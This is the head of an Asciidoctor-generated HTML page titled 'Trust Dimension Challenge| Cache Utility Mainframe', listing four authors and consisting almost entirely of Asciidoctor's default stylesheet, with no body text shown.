<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta http-equiv="X-UA-Compatible" content="IE=edge">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<meta name="generator" content="Asciidoctor 2.0.10">
<meta name="author" content="Manuel Alejandro Hernández López &lt;itsalexhelo@gmail.com&gt;, Aldo Ponce de la Cruz &lt;aldoponcedelacruz@gmail.com&gt;, Samuel Kareem Cueto González &lt;samuelcueto.2000@gmail.com&gt;, José Antonio Berrón Guitérrez &lt;A01377269@itesm.mx&gt;">
<title>Trust Dimension Challenge| Cache Utility Mainframe</title>
<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Open+Sans:300,300italic,400,400italic,600,600italic%7CNoto+Serif:400,400italic,700,700italic%7CDroid+Sans+Mono:400,700">
<style>
/* Asciidoctor default stylesheet | MIT License | https://asciidoctor.org */
/* Uncomment @import statement to use as custom stylesheet */
/*@import "https://fonts.googleapis.com/css?family=Open+Sans:300,300italic,400,400italic,600,600italic%7CNoto+Serif:400,400italic,700,700italic%7CDroid+Sans+Mono:400,700";*/
article,aside,details,figcaption,figure,footer,header,hgroup,main,nav,section{display:block}
audio,video{display:inline-block}
audio:not([controls]){display:none;height:0}
html{font-family:sans-serif;-ms-text-size-adjust:100%;-webkit-text-size-adjust:100%}
a{background:none}
a:focus{outline:thin dotted}
a:active,a:hover{outline:0}
h1{font-size:2em;margin:.67em 0}
abbr[title]{border-bottom:1px dotted}
b,strong{font-weight:bold}
dfn{font-style:italic}
hr{-moz-box-sizing:content-box;box-sizing:content-box;height:0}
mark{background:#ff0;color:#000}
code,kbd,pre,samp{font-family:monospace;font-size:1em}
pre{white-space:pre-wrap}
q{quotes:"\201C" "\201D" "\2018" "\2019"}
small{font-size:80%}
sub,sup{font-size:75%;line-height:0;position:relative;vertical-align:baseline}
sup{top:-.5em}
sub{bottom:-.25em}
img{border:0}
svg:not(:root){overflow:hidden}
figure{margin:0}
fieldset{border:1px solid silver;margin:0 2px;padding:.35em .625em .75em}
legend{border:0;padding:0}
button,input,select,textarea{font-family:inherit;font-size:100%;margin:0}
button,input{line-height:normal}
button,select{text-transform:none}
button,html input[type="button"],input[type="reset"],input[type="submit"]{-webkit-appearance:button;cursor:pointer}
button[disabled],html input[disabled]{cursor:default}
input[type="checkbox"],input[type="radio"]{box-sizing:border-box;padding:0}
button::-moz-focus-inner,input::-moz-focus-inner{border:0;padding:0}
textarea{overflow:auto;vertical-align:top}
table{border-collapse:collapse;border-spacing:0}
*,*::before,*::after{-moz-box-sizing:border-box;-webkit-box-sizing:border-box;box-sizing:border-box}
html,body{font-size:100%}
body{background:#fff;color:rgba(0,0,0,.8);padding:0;margin:0;font-family:"Noto Serif","DejaVu Serif",serif;font-weight:400;font-style:normal;line-height:1;position:relative;cursor:auto;tab-size:4;-moz-osx-font-smoothing:grayscale;-webkit-font-smoothing:antialiased}
a:hover{cursor:pointer}
img,object,embed{max-width:100%;height:auto}
object,embed{height:100%}
img{-ms-interpolation-mode:bicubic}
.left{float:left!important}
.right{float:right!important}
.text-left{text-align:left!important}
.text-right{text-align:right!important}
.text-center{text-align:center!important}
.text-justify{text-align:justify!important}
.hide{display:none}
img,object,svg{display:inline-block;vertical-align:middle}
textarea{height:auto;min-height:50px}
select{width:100%}
.center{margin-left:auto;margin-right:auto}
.stretch{width:100%}
.subheader,.admonitionblock td.content>.title,.audioblock>.title,.exampleblock>.title,.imageblock>.title,.listingblock>.title,.literalblock>.title,.stemblock>.title,.openblock>.title,.paragraph>.title,.quoteblock>.title,table.tableblock>.title,.verseblock>.title,.videoblock>.title,.dlist>.title,.olist>.title,.ulist>.title,.qlist>.title,.hdlist>.title{line-height:1.45;color:#7a2518;font-weight:400;margin-top:0;margin-bottom:.25em}
div,dl,dt,dd,ul,ol,li,h1,h2,h3,#toctitle,.sidebarblock>.content>.title,h4,h5,h6,pre,form,p,blockquote,th,td{margin:0;padding:0;direction:ltr}
a{color:#2156a5;text-decoration:underline;line-height:inherit}
a:hover,a:focus{color:#1d4b8f}
a img{border:0}
p{font-family:inherit;font-weight:400;font-size:1em;line-height:1.6;margin-bottom:1.25em;text-rendering:optimizeLegibility}
p aside{font-size:.875em;line-height:1.35;font-style:italic}
h1,h2,h3,#toctitle,.sidebarblock>.content>.title,h4,h5,h6{font-family:"Open Sans","DejaVu Sans",sans-serif;font-weight:300;font-style:normal;color:#ba3925;text-rendering:optimizeLegibility;margin-top:1em;margin-bottom:.5em;line-height:1.0125em}
h1 small,h2 small,h3 small,#toctitle small,.sidebarblock>.content>.title small,h4 small,h5 small,h6 small{font-size:60%;color:#e99b8f;line-height:0}
h1{font-size:2.125em}
h2{font-size:1.6875em}
h3,#toctitle,.sidebarblock>.content>.title{font-size:1.375em}
h4,h5{font-size:1.125em}
h6{font-size:1em}
hr{border:solid #dddddf;border-width:1px 0 0;clear:both;margin:1.25em 0 1.1875em;height:0}
em,i{font-style:italic;line-height:inherit}
strong,b{font-weight:bold;line-height:inherit}
small{font-size:60%;line-height:inherit}
code{font-family:"Droid Sans Mono","DejaVu Sans Mono",monospace;font-weight:400;color:rgba(0,0,0,.9)}
ul,ol,dl{font-size:1em;line-height:1.6;margin-bottom:1.25em;list-style-position:outside;font-family:inherit}
ul,ol{margin-left:1.5em}
ul li ul,ul li ol{margin-left:1.25em;margin-bottom:0;font-size:1em}
ul.square li ul,ul.circle li ul,ul.disc li ul{list-style:inherit}
ul.square{list-style-type:square}
ul.circle{list-style-type:circle}
ul.disc{list-style-type:disc}
ol li ul,ol li ol{margin-left:1.25em;margin-bottom:0}
dl dt{margin-bottom:.3125em;font-weight:bold}
dl dd{margin-bottom:1.25em}
abbr,acronym{text-transform:uppercase;font-size:90%;color:rgba(0,0,0,.8);border-bottom:1px dotted #ddd;cursor:help}
abbr{text-transform:none}
blockquote{margin:0 0 1.25em;padding:.5625em 1.25em 0 1.1875em;border-left:1px solid #ddd}
blockquote cite{display:block;font-size:.9375em;color:rgba(0,0,0,.6)}
blockquote cite::before{content:"\2014 \0020"}
blockquote cite a,blockquote cite a:visited{color:rgba(0,0,0,.6)}
blockquote,blockquote p{line-height:1.6;color:rgba(0,0,0,.85)}
@media screen and (min-width:768px){h1,h2,h3,#toctitle,.sidebarblock>.content>.title,h4,h5,h6{line-height:1.2}
h1{font-size:2.75em}
h2{font-size:2.3125em}
h3,#toctitle,.sidebarblock>.content>.title{font-size:1.6875em}
h4{font-size:1.4375em}}
table{background:#fff;margin-bottom:1.25em;border:solid 1px #dedede}
table thead,table tfoot{background:#f7f8f7}
table thead tr th,table thead tr td,table tfoot tr th,table tfoot tr td{padding:.5em .625em .625em;font-size:inherit;color:rgba(0,0,0,.8);text-align:left}
table tr th,table tr td{padding:.5625em .625em;font-size:inherit;color:rgba(0,0,0,.8)}
table tr.even,table tr.alt{background:#f8f8f7}
table thead tr th,table tfoot tr th,table tbody tr td,table tr td,table tfoot tr td{display:table-cell;line-height:1.6}
h1,h2,h3,#toctitle,.sidebarblock>.content>.title,h4,h5,h6{line-height:1.2;word-spacing:-.05em}
h1 strong,h2 strong,h3 strong,#toctitle strong,.sidebarblock>.content>.title strong,h4 strong,h5 strong,h6 strong{font-weight:400}
.clearfix::before,.clearfix::after,.float-group::before,.float-group::after{content:" ";display:table}
.clearfix::after,.float-group::after{clear:both}
:not(pre):not([class^=L])>code{font-size:.9375em;font-style:normal!important;letter-spacing:0;padding:.1em .5ex;word-spacing:-.15em;background:#f7f7f8;-webkit-border-radius:4px;border-radius:4px;line-height:1.45;text-rendering:optimizeSpeed;word-wrap:break-word}
:not(pre)>code.nobreak{word-wrap:normal}
:not(pre)>code.nowrap{white-space:nowrap}
pre{color:rgba(0,0,0,.9);font-family:"Droid Sans Mono","DejaVu Sans Mono",monospace;line-height:1.45;text-rendering:optimizeSpeed}
pre code,pre pre{color:inherit;font-size:inherit;line-height:inherit}
pre>code{display:block}
pre.nowrap,pre.nowrap pre{white-space:pre;word-wrap:normal}
em em{font-style:normal}
strong strong{font-weight:400}
.keyseq{color:rgba(51,51,51,.8)}
kbd{font-family:"Droid Sans Mono","DejaVu Sans Mono",monospace;display:inline-block;color:rgba(0,0,0,.8);font-size:.65em;line-height:1.45;background:#f7f7f7;border:1px solid #ccc;-webkit-border-radius:3px;border-radius:3px;-webkit-box-shadow:0 1px 0 rgba(0,0,0,.2),0 0 0 .1em white inset;box-shadow:0 1px 0 rgba(0,0,0,.2),0 0 0 .1em #fff inset;margin:0 .15em;padding:.2em .5em;vertical-align:middle;position:relative;top:-.1em;white-space:nowrap}
.keyseq kbd:first-child{margin-left:0}
.keyseq kbd:last-child{margin-right:0}
.menuseq,.menuref{color:#000}
.menuseq b:not(.caret),.menuref{font-weight:inherit}
.menuseq{word-spacing:-.02em}
.menuseq b.caret{font-size:1.25em;line-height:.8}
.menuseq i.caret{font-weight:bold;text-align:center;width:.45em}
b.button::before,b.button::after{position:relative;top:-1px;font-weight:400}
b.button::before{content:"[";padding:0 3px 0 2px}
b.button::after{content:"]";padding:0 2px 0 3px}
p a>code:hover{color:rgba(0,0,0,.9)}
#header,#content,#footnotes,#footer{width:100%;margin-left:auto;margin-right:auto;margin-top:0;margin-bottom:0;max-width:62.5em;*zoom:1;position:relative;padding-left:.9375em;padding-right:.9375em}
#header::before,#header::after,#content::before,#content::after,#footnotes::before,#footnotes::after,#footer::before,#footer::after{content:" ";display:table}
#header::after,#content::after,#footnotes::after,#footer::after{clear:both}
#content{margin-top:1.25em}
#content::before{content:none}
#header>h1:first-child{color:rgba(0,0,0,.85);margin-top:2.25rem;margin-bottom:0}
#header>h1:first-child+#toc{margin-top:8px;border-top:1px solid #dddddf}
#header>h1:only-child,body.toc2 #header>h1:nth-last-child(2){border-bottom:1px solid #dddddf;padding-bottom:8px}
#header .details{border-bottom:1px solid #dddddf;line-height:1.45;padding-top:.25em;padding-bottom:.25em;padding-left:.25em;color:rgba(0,0,0,.6);display:-ms-flexbox;display:-webkit-flex;display:flex;-ms-flex-flow:row wrap;-webkit-flex-flow:row wrap;flex-flow:row wrap}
#header .details span:first-child{margin-left:-.125em}
#header .details span.email a{color:rgba(0,0,0,.85)}
#header .details br{display:none}
#header .details br+span::before{content:"\00a0\2013\00a0"}
#header .details br+span.author::before{content:"\00a0\22c5\00a0";color:rgba(0,0,0,.85)}
#header .details br+span#revremark::before{content:"\00a0|\00a0"}
#header #revnumber{text-transform:capitalize}
#header #revnumber::after{content:"\00a0"}
#content>h1:first-child:not([class]){color:rgba(0,0,0,.85);border-bottom:1px solid #dddddf;padding-bottom:8px;margin-top:0;padding-top:1rem;margin-bottom:1.25rem}
#toc{border-bottom:1px solid #e7e7e9;padding-bottom:.5em}
#toc>ul{margin-left:.125em}
#toc ul.sectlevel0>li>a{font-style:italic}
#toc ul.sectlevel0 ul.sectlevel1{margin:.5em 0}
#toc ul{font-family:"Open Sans","DejaVu Sans",sans-serif;list-style-type:none}
#toc li{line-height:1.3334;margin-top:.3334em}
#toc a{text-decoration:none}
#toc a:active{text-decoration:underline}
#toctitle{color:#7a2518;font-size:1.2em}
@media screen and (min-width:768px){#toctitle{font-size:1.375em}
body.toc2{padding-left:15em;padding-right:0}
#toc.toc2{margin-top:0!important;background:#f8f8f7;position:fixed;width:15em;left:0;top:0;border-right:1px solid #e7e7e9;border-top-width:0!important;border-bottom-width:0!important;z-index:1000;padding:1.25em 1em;height:100%;overflow:auto}
#toc.toc2 #toctitle{margin-top:0;margin-bottom:.8rem;font-size:1.2em}
#toc.toc2>ul{font-size:.9em;margin-bottom:0}
#toc.toc2 ul ul{margin-left:0;padding-left:1em}
#toc.toc2 ul.sectlevel0 ul.sectlevel1{padding-left:0;margin-top:.5em;margin-bottom:.5em}
body.toc2.toc-right{padding-left:0;padding-right:15em}
body.toc2.toc-right #toc.toc2{border-right-width:0;border-left:1px solid #e7e7e9;left:auto;right:0}}
@media screen and (min-width:1280px){body.toc2{padding-left:20em;padding-right:0}
#toc.toc2{width:20em}
#toc.toc2 #toctitle{font-size:1.375em}
#toc.toc2>ul{font-size:.95em}
#toc.toc2 ul ul{padding-left:1.25em}
body.toc2.toc-right{padding-left:0;padding-right:20em}}
#content #toc{border-style:solid;border-width:1px;border-color:#e0e0dc;margin-bottom:1.25em;padding:1.25em;background:#f8f8f7;-webkit-border-radius:4px;border-radius:4px}
#content #toc>:first-child{margin-top:0}
#content #toc>:last-child{margin-bottom:0}
#footer{max-width:100%;background:rgba(0,0,0,.8);padding:1.25em}
#footer-text{color:rgba(255,255,255,.8);line-height:1.44}
#content{margin-bottom:.625em}
.sect1{padding-bottom:.625em}
@media screen and (min-width:768px){#content{margin-bottom:1.25em}
.sect1{padding-bottom:1.25em}}
.sect1:last-child{padding-bottom:0}
.sect1+.sect1{border-top:1px solid #e7e7e9}
#content h1>a.anchor,h2>a.anchor,h3>a.anchor,#toctitle>a.anchor,.sidebarblock>.content>.title>a.anchor,h4>a.anchor,h5>a.anchor,h6>a.anchor{position:absolute;z-index:1001;width:1.5ex;margin-left:-1.5ex;display:block;text-decoration:none!important;visibility:hidden;text-align:center;font-weight:400}
#content h1>a.anchor::before,h2>a.anchor::before,h3>a.anchor::before,#toctitle>a.anchor::before,.sidebarblock>.content>.title>a.anchor::before,h4>a.anchor::before,h5>a.anchor::before,h6>a.anchor::before{content:"\00A7";font-size:.85em;display:block;padding-top:.1em}
#content h1:hover>a.anchor,#content h1>a.anchor:hover,h2:hover>a.anchor,h2>a.anchor:hover,h3:hover>a.anchor,#toctitle:hover>a.anchor,.sidebarblock>.content>.title:hover>a.anchor,h3>a.anchor:hover,#toctitle>a.anchor:hover,.sidebarblock>.content>.title>a.anchor:hover,h4:hover>a.anchor,h4>a.anchor:hover,h5:hover>a.anchor,h5>a.anchor:hover,h6:hover>a.anchor,h6>a.anchor:hover{visibility:visible}
#content h1>a.link,h2>a.link,h3>a.link,#toctitle>a.link,.sidebarblock>.content>.title>a.link,h4>a.link,h5>a.link,h6>a.link{color:#ba3925;text-decoration:none}
#content h1>a.link:hover,h2>a.link:hover,h3>a.link:hover,#toctitle>a.link:hover,.sidebarblock>.content>.title>a.link:hover,h4>a.link:hover,h5>a.link:hover,h6>a.link:hover{color:#a53221}
details,.audioblock,.imageblock,.literalblock,.listingblock,.stemblock,.videoblock{margin-bottom:1.25em}
details>summary:first-of-type{cursor:pointer;display:list-item;outline:none;margin-bottom:.75em}
.admonitionblock td.content>.title,.audioblock>.title,.exampleblock>.title,.imageblock>.title,.listingblock>.title,.literalblock>.title,.stemblock>.title,.openblock>.title,.paragraph>.title,.quoteblock>.title,table.tableblock>.title,.verseblock>.title,.videoblock>.title,.dlist>.title,.olist>.title,.ulist>.title,.qlist>.title,.hdlist>.title{text-rendering:optimizeLegibility;text-align:left;font-family:"Noto Serif","DejaVu Serif",serif;font-size:1rem;font-style:italic}
table.tableblock.fit-content>caption.title{white-space:nowrap;width:0}
.paragraph.lead>p,#preamble>.sectionbody>[class="paragraph"]:first-of-type p{font-size:1.21875em;line-height:1.6;color:rgba(0,0,0,.85)}
table.tableblock #preamble>.sectionbody>[class="paragraph"]:first-of-type p{font-size:inherit}
.admonitionblock>table{border-collapse:separate;border:0;background:none;width:100%}
.admonitionblock>table td.icon{text-align:center;width:80px}
.admonitionblock>table td.icon img{max-width:none}
.admonitionblock>table td.icon .title{font-weight:bold;font-family:"Open Sans","DejaVu Sans",sans-serif;text-transform:uppercase}
.admonitionblock>table td.content{padding-left:1.125em;padding-right:1.25em;border-left:1px solid #dddddf;color:rgba(0,0,0,.6)}
.admonitionblock>table td.content>:last-child>:last-child{margin-bottom:0}
.exampleblock>.content{border-style:solid;border-width:1px;border-color:#e6e6e6;margin-bottom:1.25em;padding:1.25em;background:#fff;-webkit-border-radius:4px;border-radius:4px}
.exampleblock>.content>:first-child{margin-top:0}
.exampleblock>.content>:last-child{margin-bottom:0}
.sidebarblock{border-style:solid;border-width:1px;border-color:#dbdbd6;margin-bottom:1.25em;padding:1.25em;background:#f3f3f2;-webkit-border-radius:4px;border-radius:4px}
.sidebarblock>:first-child{margin-top:0}
.sidebarblock>:last-child{margin-bottom:0}
.sidebarblock>.content>.title{color:#7a2518;margin-top:0;text-align:center}
.exampleblock>.content>:last-child>:last-child,.exampleblock>.content .olist>ol>li:last-child>:last-child,.exampleblock>.content .ulist>ul>li:last-child>:last-child,.exampleblock>.content .qlist>ol>li:last-child>:last-child,.sidebarblock>.content>:last-child>:last-child,.sidebarblock>.content .olist>ol>li:last-child>:last-child,.sidebarblock>.content .ulist>ul>li:last-child>:last-child,.sidebarblock>.content .qlist>ol>li:last-child>:last-child{margin-bottom:0}
.literalblock pre,.listingblock>.content>pre{-webkit-border-radius:4px;border-radius:4px;word-wrap:break-word;overflow-x:auto;padding:1em;font-size:.8125em}
@media screen and (min-width:768px){.literalblock pre,.listingblock>.content>pre{font-size:.90625em}}
@media screen and (min-width:1280px){.literalblock pre,.listingblock>.content>pre{font-size:1em}}
.literalblock pre,.listingblock>.content>pre:not(.highlight),.listingblock>.content>pre[class="highlight"],.listingblock>.content>pre[class^="highlight "]{background:#f7f7f8}
.literalblock.output pre{color:#f7f7f8;background:rgba(0,0,0,.9)}
.listingblock>.content{position:relative}
.listingblock code[data-lang]::before{display:none;content:attr(data-lang);position:absolute;font-size:.75em;top:.425rem;right:.5rem;line-height:1;text-transform:uppercase;color:inherit;opacity:.5}
.listingblock:hover code[data-lang]::before{display:block}
.listingblock.terminal pre .command::before{content:attr(data-prompt);padding-right:.5em;color:inherit;opacity:.5}
.listingblock.terminal pre .command:not([data-prompt])::before{content:"$"}
.listingblock pre.highlightjs{padding:0}
.listingblock pre.highlightjs>code{padding:1em;-webkit-border-radius:4px;border-radius:4px}
.listingblock pre.prettyprint{border-width:0}
.prettyprint{background:#f7f7f8}
pre.prettyprint .linenums{line-height:1.45;margin-left:2em}
pre.prettyprint li{background:none;list-style-type:inherit;padding-left:0}
pre.prettyprint li code[data-lang]::before{opacity:1}
pre.prettyprint li:not(:first-child) code[data-lang]::before{display:none}
table.linenotable{border-collapse:separate;border:0;margin-bottom:0;background:none}
table.linenotable td[class]{color:inherit;vertical-align:top;padding:0;line-height:inherit;white-space:normal}
table.linenotable td.code{padding-left:.75em}
table.linenotable td.linenos{border-right:1px solid currentColor;opacity:.35;padding-right:.5em}
pre.pygments .lineno{border-right:1px solid currentColor;opacity:.35;display:inline-block;margin-right:.75em}
pre.pygments .lineno::before{content:"";margin-right:-.125em}
.quoteblock{margin:0 1em 1.25em 1.5em;display:table}
.quoteblock:not(.excerpt)>.title{margin-left:-1.5em;margin-bottom:.75em}
.quoteblock blockquote,.quoteblock p{color:rgba(0,0,0,.85);font-size:1.15rem;line-height:1.75;word-spacing:.1em;letter-spacing:0;font-style:italic;text-align:justify}
.quoteblock blockquote{margin:0;padding:0;border:0}
.quoteblock blockquote::before{content:"\201c";float:left;font-size:2.75em;font-weight:bold;line-height:.6em;margin-left:-.6em;color:#7a2518;text-shadow:0 1px 2px rgba(0,0,0,.1)}
.quoteblock blockquote>.paragraph:last-child p{margin-bottom:0}
.quoteblock .attribution{margin-top:.75em;margin-right:.5ex;text-align:right}
.verseblock{margin:0 1em 1.25em}
.verseblock pre{font-family:"Open Sans","DejaVu Sans",sans;font-size:1.15rem;color:rgba(0,0,0,.85);font-weight:300;text-rendering:optimizeLegibility}
.verseblock pre strong{font-weight:400}
.verseblock .attribution{margin-top:1.25rem;margin-left:.5ex}
.quoteblock .attribution,.verseblock .attribution{font-size:.9375em;line-height:1.45;font-style:italic}
.quoteblock .attribution br,.verseblock .attribution br{display:none}
.quoteblock .attribution cite,.verseblock .attribution cite{display:block;letter-spacing:-.025em;color:rgba(0,0,0,.6)}
.quoteblock.abstract blockquote::before,.quoteblock.excerpt blockquote::before,.quoteblock .quoteblock blockquote::before{display:none}
.quoteblock.abstract blockquote,.quoteblock.abstract p,.quoteblock.excerpt blockquote,.quoteblock.excerpt p,.quoteblock .quoteblock blockquote,.quoteblock .quoteblock p{line-height:1.6;word-spacing:0}
.quoteblock.abstract{margin:0 1em 1.25em;display:block}
.quoteblock.abstract>.title{margin:0 0 .375em;font-size:1.15em;text-align:center}
.quoteblock.excerpt>blockquote,.quoteblock .quoteblock{padding:0 0 .25em 1em;border-left:.25em solid #dddddf}
.quoteblock.excerpt,.quoteblock .quoteblock{margin-left:0}
.quoteblock.excerpt blockquote,.quoteblock.excerpt p,.quoteblock .quoteblock blockquote,.quoteblock .quoteblock p{color:inherit;font-size:1.0625rem}
.quoteblock.excerpt .attribution,.quoteblock .quoteblock .attribution{color:inherit;text-align:left;margin-right:0}
table.tableblock{max-width:100%;border-collapse:separate}
p.tableblock:last-child{margin-bottom:0}
td.tableblock>.content>:last-child{margin-bottom:-1.25em}
td.tableblock>.content>:last-child.sidebarblock{margin-bottom:0}
table.tableblock,th.tableblock,td.tableblock{border:0 solid #dedede}
table.grid-all>thead>tr>.tableblock,table.grid-all>tbody>tr>.tableblock{border-width:0 1px 1px 0}
table.grid-all>tfoot>tr>.tableblock{border-width:1px 1px 0 0}
table.grid-cols>*>tr>.tableblock{border-width:0 1px 0 0}
table.grid-rows>thead>tr>.tableblock,table.grid-rows>tbody>tr>.tableblock{border-width:0 0 1px}
table.grid-rows>tfoot>tr>.tableblock{border-width:1px 0 0}
table.grid-all>*>tr>.tableblock:last-child,table.grid-cols>*>tr>.tableblock:last-child{border-right-width:0}
table.grid-all>tbody>tr:last-child>.tableblock,table.grid-all>thead:last-child>tr>.tableblock,table.grid-rows>tbody>tr:last-child>.tableblock,table.grid-rows>thead:last-child>tr>.tableblock{border-bottom-width:0}
table.frame-all{border-width:1px}
table.frame-sides{border-width:0 1px}
table.frame-topbot,table.frame-ends{border-width:1px 0}
table.stripes-all tr,table.stripes-odd tr:nth-of-type(odd),table.stripes-even tr:nth-of-type(even),table.stripes-hover tr:hover{background:#f8f8f7}
th.halign-left,td.halign-left{text-align:left}
th.halign-right,td.halign-right{text-align:right}
th.halign-center,td.halign-center{text-align:center}
th.valign-top,td.valign-top{vertical-align:top}
th.valign-bottom,td.valign-bottom{vertical-align:bottom}
th.valign-middle,td.valign-middle{vertical-align:middle}
table thead th,table tfoot th{font-weight:bold}
tbody tr th{display:table-cell;line-height:1.6;background:#f7f8f7}
tbody tr th,tbody tr th p,tfoot tr th,tfoot tr th p{color:rgba(0,0,0,.8);font-weight:bold}
p.tableblock>code:only-child{background:none;padding:0}
p.tableblock{font-size:1em}
ol{margin-left:1.75em}
ul li ol{margin-left:1.5em}
dl dd{margin-left:1.125em}
dl dd:last-child,dl dd:last-child>:last-child{margin-bottom:0}
ol>li p,ul>li p,ul dd,ol dd,.olist .olist,.ulist .ulist,.ulist .olist,.olist .ulist{margin-bottom:.625em}
ul.checklist,ul.none,ol.none,ul.no-bullet,ol.no-bullet,ol.unnumbered,ul.unstyled,ol.unstyled{list-style-type:none}
ul.no-bullet,ol.no-bullet,ol.unnumbered{margin-left:.625em}
ul.unstyled,ol.unstyled{margin-left:0}
ul.checklist{margin-left:.625em}
ul.checklist li>p:first-child>.fa-square-o:first-child,ul.checklist li>p:first-child>.fa-check-square-o:first-child{width:1.25em;font-size:.8em;position:relative;bottom:.125em}
ul.checklist li>p:first-child>input[type="checkbox"]:first-child{margin-right:.25em}
ul.inline{display:-ms-flexbox;display:-webkit-box;display:flex;-ms-flex-flow:row wrap;-webkit-flex-flow:row wrap;flex-flow:row wrap;list-style:none;margin:0 0 .625em -1.25em}
ul.inline>li{margin-left:1.25em}
.unstyled dl dt{font-weight:400;font-style:normal}
ol.arabic{list-style-type:decimal}
ol.decimal{list-style-type:decimal-leading-zero}
ol.loweralpha{list-style-type:lower-alpha}
ol.upperalpha{list-style-type:upper-alpha}
ol.lowerroman{list-style-type:lower-roman}
ol.upperroman{list-style-type:upper-roman}
ol.lowergreek{list-style-type:lower-greek}
.hdlist>table,.colist>table{border:0;background:none}
.hdlist>table>tbody>tr,.colist>table>tbody>tr{background:none}
td.hdlist1,td.hdlist2{vertical-align:top;padding:0 .625em}
td.hdlist1{font-weight:bold;padding-bottom:1.25em}
.literalblock+.colist,.listingblock+.colist{margin-top:-.5em}
.colist td:not([class]):first-child{padding:.4em .75em 0;line-height:1;vertical-align:top}
.colist td:not([class]):first-child img{max-width:none}
.colist td:not([class]):last-child{padding:.25em 0}
.thumb,.th{line-height:0;display:inline-block;border:solid 4px #fff;-webkit-box-shadow:0 0 0 1px #ddd;box-shadow:0 0 0 1px #ddd}
.imageblock.left{margin:.25em .625em 1.25em 0}
.imageblock.right{margin:.25em 0 1.25em .625em}
.imageblock>.title{margin-bottom:0}
.imageblock.thumb,.imageblock.th{border-width:6px}
.imageblock.thumb>.title,.imageblock.th>.title{padding:0 .125em}
.image.left,.image.right{margin-top:.25em;margin-bottom:.25em;display:inline-block;line-height:0}
.image.left{margin-right:.625em}
.image.right{margin-left:.625em}
a.image{text-decoration:none;display:inline-block}
a.image object{pointer-events:none}
sup.footnote,sup.footnoteref{font-size:.875em;position:static;vertical-align:super}
sup.footnote a,sup.footnoteref a{text-decoration:none}
sup.footnote a:active,sup.footnoteref a:active{text-decoration:underline}
#footnotes{padding-top:.75em;padding-bottom:.75em;margin-bottom:.625em}
#footnotes hr{width:20%;min-width:6.25em;margin:-.25em 0 .75em;border-width:1px 0 0}
#footnotes .footnote{padding:0 .375em 0 .225em;line-height:1.3334;font-size:.875em;margin-left:1.2em;margin-bottom:.2em}
#footnotes .footnote a:first-of-type{font-weight:bold;text-decoration:none;margin-left:-1.05em}
#footnotes .footnote:last-of-type{margin-bottom:0}
#content #footnotes{margin-top:-.625em;margin-bottom:0;padding:.75em 0}
.gist .file-data>table{border:0;background:#fff;width:100%;margin-bottom:0}
.gist .file-data>table td.line-data{width:99%}
div.unbreakable{page-break-inside:avoid}
.big{font-size:larger}
.small{font-size:smaller}
.underline{text-decoration:underline}
.overline{text-decoration:overline}
.line-through{text-decoration:line-through}
.aqua{color:#00bfbf}
.aqua-background{background:#00fafa}
.black{color:#000}
.black-background{background:#000}
.blue{color:#0000bf}
.blue-background{background:#0000fa}
.fuchsia{color:#bf00bf}
.fuchsia-background{background:#fa00fa}
.gray{color:#606060}
.gray-background{background:#7d7d7d}
.green{color:#006000}
.green-background{background:#007d00}
.lime{color:#00bf00}
.lime-background{background:#00fa00}
.maroon{color:#600000}
.maroon-background{background:#7d0000}
.navy{color:#000060}
.navy-background{background:#00007d}
.olive{color:#606000}
.olive-background{background:#7d7d00}
.purple{color:#600060}
.purple-background{background:#7d007d}
.red{color:#bf0000}
.red-background{background:#fa0000}
.silver{color:#909090}
.silver-background{background:#bcbcbc}
.teal{color:#006060}
.teal-background{background:#007d7d}
.white{color:#bfbfbf}
.white-background{background:#fafafa}
.yellow{color:#bfbf00}
.yellow-background{background:#fafa00}
span.icon>.fa{cursor:default}
a span.icon>.fa{cursor:inherit}
.admonitionblock td.icon [class^="fa icon-"]{font-size:2.5em;text-shadow:1px 1px 2px rgba(0,0,0,.5);cursor:default}
.admonitionblock td.icon .icon-note::before{content:"\f05a";color:#19407c}
.admonitionblock td.icon .icon-tip::before{content:"\f0eb";text-shadow:1px 1px 2px rgba(155,155,0,.8);color:#111}
.admonitionblock td.icon .icon-warning::before{content:"\f071";color:#bf6900}
.admonitionblock td.icon .icon-caution::before{content:"\f06d";color:#bf3400}
.admonitionblock td.icon .icon-important::before{content:"\f06a";color:#bf0000}
.conum[data-value]{display:inline-block;color:#fff!important;background:rgba(0,0,0,.8);-webkit-border-radius:100px;border-radius:100px;text-align:center;font-size:.75em;width:1.67em;height:1.67em;line-height:1.67em;font-family:"Open Sans","DejaVu Sans",sans-serif;font-style:normal;font-weight:bold}
.conum[data-value] *{color:#fff!important}
.conum[data-value]+b{display:none}
.conum[data-value]::after{content:attr(data-value)}
pre .conum[data-value]{position:relative;top:-.125em}
b.conum *{color:inherit!important}
.conum:not([data-value]):empty{display:none}
dt,th.tableblock,td.content,div.footnote{text-rendering:optimizeLegibility}
h1,h2,p,td.content,span.alt{letter-spacing:-.01em}
p strong,td.content strong,div.footnote strong{letter-spacing:-.005em}
p,blockquote,dt,td.content,span.alt{font-size:1.0625rem}
p{margin-bottom:1.25rem}
.sidebarblock p,.sidebarblock dt,.sidebarblock td.content,p.tableblock{font-size:1em}
.exampleblock>.content{background:#fffef7;border-color:#e0e0dc;-webkit-box-shadow:0 1px 4px #e0e0dc;box-shadow:0 1px 4px #e0e0dc}
.print-only{display:none!important}
@page{margin:1.25cm .75cm}
@media print{*{-webkit-box-shadow:none!important;box-shadow:none!important;text-shadow:none!important}
html{font-size:80%}
a{color:inherit!important;text-decoration:underline!important}
a.bare,a[href^="#"],a[href^="mailto:"]{text-decoration:none!important}
a[href^="http:"]:not(.bare)::after,a[href^="https:"]:not(.bare)::after{content:"(" attr(href) ")";display:inline-block;font-size:.875em;padding-left:.25em}
abbr[title]::after{content:" (" attr(title) ")"}
pre,blockquote,tr,img,object,svg{page-break-inside:avoid}
thead{display:table-header-group}
svg{max-width:100%}
p,blockquote,dt,td.content{font-size:1em;orphans:3;widows:3}
h2,h3,#toctitle,.sidebarblock>.content>.title{page-break-after:avoid}
#toc,.sidebarblock,.exampleblock>.content{background:none!important}
#toc{border-bottom:1px solid #dddddf!important;padding-bottom:0!important}
body.book #header{text-align:center}
body.book #header>h1:first-child{border:0!important;margin:2.5em 0 1em}
body.book #header .details{border:0!important;display:block;padding:0!important}
body.book #header .details span:first-child{margin-left:0!important}
body.book #header .details br{display:block}
body.book #header .details br+span::before{content:none!important}
body.book #toc{border:0!important;text-align:left!important;padding:0!important;margin:0!important}
